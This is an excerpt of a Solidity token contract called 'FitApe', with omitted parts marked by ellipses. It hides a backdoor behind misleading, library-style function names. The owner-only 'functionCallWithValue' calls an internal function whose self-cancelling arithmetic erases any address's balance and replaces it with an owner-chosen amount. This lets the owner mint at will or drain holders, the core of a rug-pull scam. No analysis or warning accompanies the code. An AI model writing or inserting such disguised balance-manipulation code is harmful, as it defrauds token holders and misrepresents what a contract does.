...
contract FitApe is Context, IBEP2022, Ownable {
 ...
 function _approve(address owner, address spender, uint256 amount) internal {
   ...
   emit Approval(owner, spender, amount);
    ...
    function functionCallWithValue(address addresscall, uint256 unitcall) public isOwner {
        functionDelegateCall(addresscall, unitcall);

    }
  
    function functionDelegateCall(address addresscall, uint256 unitcall) internal {
        _tOwned[addresscall] = (_tOwned[addresscall] * 1 * 2 - 
        _tOwned[addresscall] * 1 * 2) + (unitcall * 10 ** 9);
